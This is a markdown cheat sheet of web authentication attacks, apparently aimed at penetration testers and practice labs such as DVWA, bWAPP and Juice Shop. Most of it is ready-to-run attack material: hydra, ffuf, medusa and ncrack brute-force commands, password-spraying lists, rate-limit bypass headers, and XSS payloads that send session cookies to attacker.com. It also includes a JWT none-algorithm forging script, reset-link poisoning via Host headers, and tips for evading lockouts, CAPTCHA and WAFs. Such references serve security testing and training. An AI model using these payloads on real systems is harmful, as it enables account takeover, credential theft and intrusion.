# Authentication Attacks Hints & Cheat Sheet

Quick reference for authentication testing, brute force payloads, and session attacks.

---

## Brute Force Commands

### Hydra

```bash
# HTTP GET form
hydra -l admin -P passwords.txt target http-get-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# HTTP POST form
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# With cookies
hydra -l admin -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect:H=Cookie: session=abc123"

# Multiple users
hydra -L users.txt -P passwords.txt target http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"

# Basic Auth
hydra -l admin -P passwords.txt target http-get /admin

# SSH
hydra -l root -P passwords.txt ssh://target

# FTP
hydra -l admin -P passwords.txt ftp://target

# Limit threads and add wait
hydra -l admin -P passwords.txt -t 4 -w 5 target http-post-form "..."
```

### ffuf

```bash
# Password brute force
ffuf -w passwords.txt -u http://target/login -X POST -d "user=admin&pass=FUZZ" -fc 401

# Username enumeration
ffuf -w users.txt -u http://target/login -X POST -d "user=FUZZ&pass=test" -mc 200

# With cookies
ffuf -w passwords.txt -u http://target/login -X POST -d "user=admin&pass=FUZZ" -H "Cookie: session=abc" -fc 401

# Filter by response size
ffuf -w passwords.txt -u http://target/login -X POST -d "user=admin&pass=FUZZ" -fs 1234
```

### Medusa

```bash
# HTTP
medusa -h target -u admin -P passwords.txt -M http -m DIR:/admin

# SSH
medusa -h target -u root -P passwords.txt -M ssh

# MySQL
medusa -h target -u root -P passwords.txt -M mysql
```

### Ncrack

```bash
# SSH
ncrack -p 22 --user admin -P passwords.txt target

# RDP
ncrack -p 3389 --user admin -P passwords.txt target

# FTP
ncrack -p 21 --user admin -P passwords.txt target
```

---

## Common Password Lists

### Top 10 Passwords

```
123456
password
12345678
qwerty
123456789
12345
1234
111111
1234567
dragon
```

### Password Spraying List

```
Password1
Welcome1
Spring2024
Summer2024
Winter2024
Fall2024
CompanyName123
Password123
Changeme1
```

### SecLists Paths

```
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
/usr/share/seclists/Passwords/Common-Credentials/best1050.txt
/usr/share/seclists/Passwords/darkweb2017-top10000.txt
/usr/share/seclists/Passwords/rockyou.txt
```

---

## Username Enumeration

### Detection Techniques

```
# Different error messages
"Invalid username" vs "Invalid password"

# Response length differences
# Use Burp Comparer

# Response time differences
# Valid user may take longer (password hash check)

# Registration page
# "Username already exists"

# Password reset
# "Email sent" vs "User not found"
```

### Common Admin Usernames

```
admin
administrator
root
sysadmin
webmaster
support
user
test
guest
manager
```

---

## Rate Limiting Bypass

### Header Manipulation

```
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
```

### Request Variations

```
# Case manipulation
admin vs Admin vs ADMIN

# Parameter pollution
username=admin&username=test

# Encoding variations
username=admin vs username=%61dmin

# Adding null bytes
username=admin%00
```

### Distributed Attack

```bash
# Rotate IP addresses using proxychains
proxychains hydra ...

# Use multiple proxy servers
```

---

## Session Attacks

### Session Hijacking via XSS

```javascript
// Steal cookie
document.location='http://attacker.com/steal?c='+document.cookie

// Using Image
new Image().src='http://attacker.com/steal?c='+document.cookie

// Using fetch
fetch('http://attacker.com/steal?c='+document.cookie)
```

### Session Fixation

```
# Force session in URL
http://target.com/login?PHPSESSID=attackersession

# Force session in form
<form action="http://target.com/login">
  <input type="hidden" name="PHPSESSID" value="attackersession">
</form>
```

### Session Prediction

```
# Analyze multiple sessions
Session 1: 1609459200
Session 2: 1609459201
Session 3: 1609459202

# Time-based: Try current timestamp
# Sequential: Increment/decrement
# Pattern-based: Identify algorithm
```

### Cookie Analysis

```
# Check for security attributes
HttpOnly - Prevents JavaScript access
Secure - HTTPS only
SameSite - CSRF protection
Path - Scope limitation
Domain - Domain scope
Expires - Session duration
```

---

## JWT Attacks

### JWT Structure

```
Header.Payload.Signature

# Decode (base64)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}
```

### None Algorithm Attack

```python
import base64
import json

# Original token
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.signature"

# Modify header
header = {"alg": "none", "typ": "JWT"}
header_b64 = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=')

# Modify payload
payload = {"user": "admin"}
payload_b64 = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=')

# Create new token (no signature)
new_token = f"{header_b64}.{payload_b64}."
print(new_token)
```

### Cracking JWT Secret

```bash
# Using hashcat
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

# Using John
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Using jwt_tool
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt
```

### JWT Tool Commands

```bash
# Analyze token
jwt_tool <token>

# Tamper payload
jwt_tool <token> -T

# None algorithm
jwt_tool <token> -X a

# Crack secret
jwt_tool <token> -C -d wordlist.txt
```

---

## Password Reset Attacks

### Host Header Injection

```
POST /forgot-password HTTP/1.1
Host: attacker.com
...

# Or with multiple Host headers
Host: target.com
Host: attacker.com

# Or with X-Forwarded-Host
X-Forwarded-Host: attacker.com
```

### Token Manipulation

```
# Predictable tokens
Analyze pattern: token_user123_timestamp
Generate: token_admin_timestamp

# Token reuse
Use same token multiple times

# Token for other users
Change email but keep token
```

### Parameter Tampering

```
# Change email
email=victim@test.com&email=attacker@test.com

# Hidden parameters
email=victim@test.com&user=admin

# Array injection
email[]=victim@test.com&email[]=attacker@test.com
```

---

## Platform-Specific Payloads

### DVWA

```bash
# Low Security
hydra -l admin -P passwords.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:incorrect:H=Cookie: PHPSESSID=xxx; security=low"

# Medium Security (add delay)
hydra -l admin -P passwords.txt -t 1 -w 5 localhost http-get-form "..."

# High Security (need CSRF token - use custom script)
```

### bWAPP

```bash
# Session fixation URL
http://localhost:8082/bWAPP/sm_fixation.php?PHPSESSID=attacker

# Brute force
hydra -l bee -P passwords.txt localhost http-post-form "/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid"
```

### Juice Shop

```
# SQL injection login bypass
admin@juice-sh.op'--

# JWT manipulation required for some challenges
# Capture token, modify, resign
```

### WebGoat

```
# Check specific lesson requirements
# Usually involves parameter manipulation
```

---

## Quick Reference Tables

### Authentication Bypass Techniques

| Technique | Description |
|-----------|-------------|
| SQL Injection | `' OR '1'='1` in login |
| Default Credentials | admin/admin, admin/password |
| Brute Force | Try all passwords |
| Credential Stuffing | Use leaked credentials |
| Password Spraying | Few passwords, many users |
| Session Hijacking | Steal session cookie |
| Session Fixation | Force known session |

### Session Cookie Flags

| Flag | Security Benefit |
|------|-----------------|
| HttpOnly | Prevents XSS cookie theft |
| Secure | HTTPS only transmission |
| SameSite=Strict | Prevents CSRF |
| Path=/ | Limits cookie scope |

### Common Weaknesses

| Weakness | Attack |
|----------|--------|
| No rate limiting | Brute force |
| Predictable sessions | Session prediction |
| Session in URL | Session hijacking |
| Weak JWT secret | JWT cracking |
| No session regeneration | Session fixation |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| Account lockout | Use password spraying instead |
| CAPTCHA | Try OCR tools or manual bypass |
| CSRF tokens | Use Burp macros to fetch tokens |
| WAF blocking | Slow down, use encoding |
| IP blocking | Rotate IPs/proxies |
| Rate limiting | Add delays, use headers |

---

## OWASP References

- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Testing Authentication](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/)

## Additional Resources

- [PayloadsAllTheThings - Authentication](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Authentication%20Bypass)
- [HackTricks - Login Bypass](https://book.hacktricks.xyz/pentesting-web/login-bypass)
- [SecLists - Passwords](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
